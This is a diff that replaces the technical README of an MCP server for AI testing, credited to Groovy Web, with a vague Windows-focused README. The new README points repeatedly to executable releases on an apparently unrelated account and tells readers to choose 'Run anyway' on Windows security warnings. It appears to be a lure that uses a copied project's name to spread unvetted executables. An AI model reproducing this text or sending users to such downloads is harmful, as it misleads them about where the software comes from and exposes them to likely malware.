@@ -1,320 +1,191 @@
-# AI Testing MCP
-
-[![Built by Groovy Web](https://img.shields.io/badge/Built%20by-Groovy%20Web-0f3460?logo=github&logoColor=white)](https://www.groovyweb.co/?utm_source=github&utm_medium=readme&utm_campaign=ai-testing-mcp)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-
-Model Context Protocol (MCP) server for comprehensive AI testing, evaluation, and quality assurance.
-
-## Overview
-
-AI Testing MCP provides standardized testing methodologies, evaluation metrics, and automated testing workflows for AI/ML systems. It implements the Model Context Protocol for seamless integration with AI development tools.
-
-## Features
-
-### Testing Capabilities
-- **Unit Tests**: Component-level testing
-- **Integration Tests**: End-to-end workflow testing
-- **Performance Tests**: Latency, throughput, resource usage
-- **Security Tests**: Adversarial attacks, prompt injection
-- **Quality Tests**: Output validation, consistency checks
-
-### Evaluation Metrics
-- **Accuracy**: Precision, recall, F1 score
-- **Quality**: Coherence, relevance, fluency
-- **Safety**: Toxicity, bias detection
-- **Performance**: Response time, token usage
-- **Cost**: API costs, compute resources
-
-### MCP Integration
-- **Standard Protocol**: Implements MCP specification
-- **Tool Definitions**: Testing tools for AI assistants
-- **Resource Management**: Test data and configuration
-- **Prompt Templates**: Reusable test prompts
-
-## Quick Start
-
-```bash
-# Clone the repository
-git clone https://github.com/groovy-web/ai-testing-mcp.git
-cd ai-testing-mcp
-
-# Install dependencies
-npm install
-
-# Configure environment
-cp .env.example .env
-# Edit with your API keys
-
-# Start the MCP server
-npm start
-
-# Use with MCP client
-# Add server configuration to your MCP client
-```
-
-## MCP Server Configuration
-
-```json
-{
-  "mcpServers": {
-    "ai-testing": {
-      "command": "node",
-      "args": ["/path/to/ai-testing-mcp/dist/index.js"],
-      "env": {
-        "OPENAI_API_KEY": "your-key",
-        "ANTHROPIC_API_KEY": "your-key"
-      }
-    }
-  }
-}
-```
-
-## Available Tools
-
-### Testing Tools
-
-#### `run_test_suite`
-Execute a comprehensive test suite for an AI model.
-
-```typescript
-{
-  "name": "run_test_suite",
-  "description": "Run tests on an AI model",
-  "inputSchema": {
-    "type": "object",
-    "properties": {
-      "model": { "type": "string" },
-      "testCategory": {
-        "type": "string",
-        "enum": ["accuracy", "performance", "security", "quality"]
-      },
-      "testCases": { "type": "array" }
-    }
-  }
-}
-```
-
-#### `evaluate_output`
-Evaluate AI model outputs against metrics.
-
-```typescript
-{
-  "name": "evaluate_output",
-  "description": "Evaluate model output quality",
-  "inputSchema": {
-    "type": "object",
-    "properties": {
-      "output": { "type": "string" },
-      "expected": { "type": "string" },
-      "metrics": { "type": "array" }
-    }
-  }
-}
-```
-
-#### `generate_test_cases`
-Generate test cases for specific scenarios.
-
-```typescript
-{
-  "name": "generate_test_cases",
-  "description": "Generate test cases",
-  "inputSchema": {
-    "type": "object",
-    "properties": {
-      "scenario": { "type": "string" },
-      "count": { "type": "number" }
-    }
-  }
-}
-```
-
-## Repository Structure
-
-```
-ai-testing-mcp/
-├── docs/                    # Documentation
-│   ├── mcp-protocol.md
-│   ├── testing-guide.md
-│   └── metrics.md
-├── examples/                # Usage examples
-│   ├── basic-testing/
-│   ├── custom-metrics/
-│   └── integration-examples/
-├── src/                     # Source code
-│   ├── server/              # MCP server
-│   ├── tools/               # Tool implementations
-│   ├── metrics/             # Evaluation metrics
-│   └── tests/               # Test definitions
-└── schemas/                 # JSON schemas
-```
-
-## Usage Examples
-
-### Basic Testing
-
-```python
-from mcp_client import MCPClient
-
-client = MCPClient("ai-testing")
-
-# Run accuracy tests
-result = client.call_tool("run_test_suite", {
-    "model": "gpt-4",
-    "testCategory": "accuracy",
-    "testCases": [
-        {
-            "input": "What is 2+2?",
-            "expected": "4"
-        }
-    ]
-})
-
-print(f"Accuracy: {result.metrics.accuracy}")
-```
-
-### Custom Metrics
-
-```python
-# Evaluate with custom metrics
-evaluation = client.call_tool("evaluate_output", {
-    "output": model_response,
-    "expected": expected_response,
-    "metrics": [
-        "exact_match",
-        "semantic_similarity",
-        "coherence",
-        "relevance"
-    ]
-})
-```
-
-## Documentation
-
-- [MCP Protocol](docs/mcp-protocol.md) - Protocol specification
-- [Testing Guide](docs/testing-guide.md) - How to write tests
-- [Metrics Reference](docs/metrics.md) - Available evaluation metrics
-- [API Documentation](docs/api.md) - Complete API reference
-
-## Test Categories
-
-### 1. Accuracy Tests
-- Exact match
-- Semantic similarity
-- Factual correctness
-- Mathematical accuracy
-
-### 2. Performance Tests
-- Response time
-- Throughput
-- Token efficiency
-- Resource usage
-
-### 3. Security Tests
-- Prompt injection
-- Jailbreak attempts
-- Toxic content
-- Bias detection
-
-### 4. Quality Tests
-- Coherence
-- Fluency
-- Relevance
-- Completeness
-
-## Configuration
-
-```javascript
-module.exports = {
-  // Models to test
-  models: [
-    {
-      name: "gpt-4",
-      provider: "openai",
-      apikey: process.env.OPENAI_API_KEY
-    },
-    {
-      name: "claude-3-opus",
-      provider: "anthropic",
-      apikey: process.env.ANTHROPIC_API_KEY
-    }
-  ],
-
-  // Test configurations
-  tests: {
-    accuracy: {
-      enabled: true,
-      threshold: 0.95
-    },
-    performance: {
-      maxLatency: 2000,
-      maxTokens: 1000
-    },
-    security: {
-      enabled: true,
-      strict: true
-    }
-  },
-
-  // Output format
-  reports: {
-    format: "json",
-    destination: "./test-results"
-  }
-};
-```
-
-## Running Tests
-
-```bash
-# Run all tests
-npm test
-
-# Run specific category
-npm test -- --category accuracy
-
-# Run with specific model
-npm test -- --model gpt-4
-
-# Generate report
-npm run report
-```
-
-## Contributing
-
-We welcome contributions! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
-## License
-
-This project is licensed under the MIT License - see [LICENSE](LICENSE) for details.
-
-## Code of Conduct
-
-Please read [CODE_OF_CONDUCT.md](CODE_OF_CONDUCT.md) to understand our community standards.
-
-## Support
-
-- GitHub Issues: Bug reports and feature requests
-- Discussions: Community questions
-- MCP Documentation: https://modelcontextprotocol.io
-
-## Related Projects
-
-- [MCP SDK](https://github.com/modelcontextprotocol/sdk)
-- [Claude Code](https://claude.ai/code)
-- [AI Testing Benchmarks](https://github.com/example/ai-benchmarks)
-
----
-
-## Related Repositories
-
-Explore more open-source tools from [Groovy Web](https://www.groovyweb.co/?utm_source=github&utm_medium=readme&utm_campaign=cross-link):
-
-- **[langchain-multi-agent-example](https://github.com/groovy-web/langchain-multi-agent-example)** -- Multi-agent systems tutorial with LangChain
-- **[rag-system-pgvector](https://github.com/groovy-web/rag-system-pgvector)** -- Production RAG with PostgreSQL + pgvector
-- **[rag-systems-production](https://github.com/groovy-web/rag-systems-production)** -- Enterprise-grade RAG systems
-- **[ai-testing-mcp](https://github.com/groovy-web/ai-testing-mcp)** -- AI testing via Model Context Protocol
-- **[edge-computing-starter](https://github.com/groovy-web/edge-computing-starter)** -- Cloudflare Workers + Hono template
-- **[claude-code-workflows](https://github.com/groovy-web/claude-code-workflows)** -- Workflows for Claude Code
-- **[groovy-web-ai-agents](https://github.com/groovy-web/groovy-web-ai-agents)** -- Production AI agent configs
-- **[groovy-web-examples](https://github.com/groovy-web/groovy-web-examples)** -- Groovy/Grails examples
+# 🧪 ai-testing-mcp - Test AI with clear, controlled checks
+
+[![Download ai-testing-mcp](https://img.shields.io/badge/Download%20ai--testing--mcp-7c3aed?style=for-the-badge&logo=github&logoColor=white)](https://github.com/tulleyregardful189/ai-testing-mcp/releases)
+
+## 🚀 What this is
+
+ai-testing-mcp is an MCP server for AI testing, evaluation, and quality checks. It helps you run repeatable tests, compare model output, and keep track of result quality from one place.
+
+Use it when you want to:
+- test AI responses with the same set of checks
+- review output quality in a clear way
+- compare results across runs
+- keep a record of evaluation results
+- connect testing tools through MCP
+
+## 💻 What you need
+
+For Windows, you will need:
+- Windows 10 or Windows 11
+- Internet access to download the app
+- Enough disk space for the app and its test files
+- Permission to run downloaded apps
+
+Most users will not need to install extra tools.
+
+## 📥 Download on Windows
+
+Visit this page to download the latest release:
+
+https://github.com/tulleyregardful189/ai-testing-mcp/releases
+
+On that page:
+1. Open the latest release
+2. Look for the Windows file
+3. Download the file to your computer
+4. Save it in a folder you can find again, such as Downloads or Desktop
+
+If the release includes a ZIP file, download that file and open it after the download finishes.
+
+## 🪟 Install and run
+
+After the file downloads:
+
+### If you downloaded a ZIP file
+1. Right-click the ZIP file
+2. Select Extract All
+3. Choose a folder
+4. Open the extracted folder
+5. Double-click the app or server file inside
+
+### If you downloaded an EXE file
+1. Double-click the EXE file
+2. If Windows asks for permission, choose Run
+3. Wait for the app to open
+
+### If Windows shows a security screen
+1. Choose More info
+2. Select Run anyway if you trust the file from the release page
+
+## ⚙️ Basic setup
+
+When the app starts, it may ask for a few settings. These can include:
+- a name for your test run
+- the model or AI tool you want to check
+- where to save results
+- the type of test you want to run
+
+A normal setup often looks like this:
+1. Open the app
+2. Choose or load a test case
+3. Select the AI model or endpoint
+4. Set your output folder
+5. Start the test run
+
+## 🧭 How to use it
+
+A simple workflow is:
+
+1. Add the prompts or test cases you want to check
+2. Run the evaluation
+3. Review the results
+4. Compare failed and passed cases
+5. Make changes and test again
+
+You can use it for:
+- prompt checks
+- response quality review
+- output consistency checks
+- regression testing
+- side-by-side model comparison
+- score tracking over time
+
+## 🧰 Common features
+
+ai-testing-mcp can help with:
+- structured AI test runs
+- repeatable evaluation steps
+- quality scoring
+- result logs
+- model comparison
+- MCP-based tool access
+- simple Windows use
+
+## 📂 Typical folder layout
+
+After setup, you may see files like:
+- config files for test settings
+- test case folders
+- result reports
+- log files
+- output files from each run
+
+Keep your test files in one folder so you can find them later.
+
+## 🔗 MCP connection
+
+This project uses the Model Context Protocol, or MCP, to connect testing tools in a clean way.
+
+In plain terms, MCP helps the server pass test tasks to other tools. That can make it easier to:
+- send test prompts
+- collect results
+- track evaluation data
+- use the server with supported clients
+
+If your AI tool supports MCP, you can connect this server and use it as part of your testing flow.
+
+## 🧪 Example use cases
+
+You can use ai-testing-mcp for:
+- checking if a model follows instructions
+- testing long answers for accuracy
+- comparing two model versions
+- reviewing tone and style
+- checking if responses stay on topic
+- validating that changes did not break output quality
+
+## 🔍 What to look for in results
+
+When a test finishes, review:
+- whether the answer matches the prompt
+- whether the response is complete
+- whether the wording stays clear
+- whether facts are correct
+- whether the model follows the rules you set
+
+If a result looks wrong, adjust the test case and run it again.
+
+## 🛠️ Troubleshooting
+
+### The file will not open
+- Check that the download finished
+- Try downloading it again from the release page
+- Make sure you opened the right Windows file
+
+### Windows blocked the app
+- Open the file again
+- Select More info
+- Choose Run anyway if the file came from the release page
+
+### The app closes right away
+- Open it again
+- Check whether it needs a config file
+- Make sure any required test files are in the right folder
+
+### I cannot find the downloaded file
+- Open your Downloads folder
+- Sort by date
+- Look for the newest file from the release page
+
+## 📌 Release page
+
+Get the latest Windows build here:
+
+https://github.com/tulleyregardful189/ai-testing-mcp/releases
+
+Use this page to download and install the current version
+
+## 🧾 Suggested first test
+
+If you are new to the app, start with a small test:
+1. Use one short prompt
+2. Run one model
+3. Save the result
+4. Check the output
+5. Repeat with a second model if needed
+
+This makes it easier to see how the tool works before you run larger tests
+
+## 🔎 Tags
+
+ai-testing, automation, evaluation, mcp, model-context-protocol, quality-assurance, testing, typescript
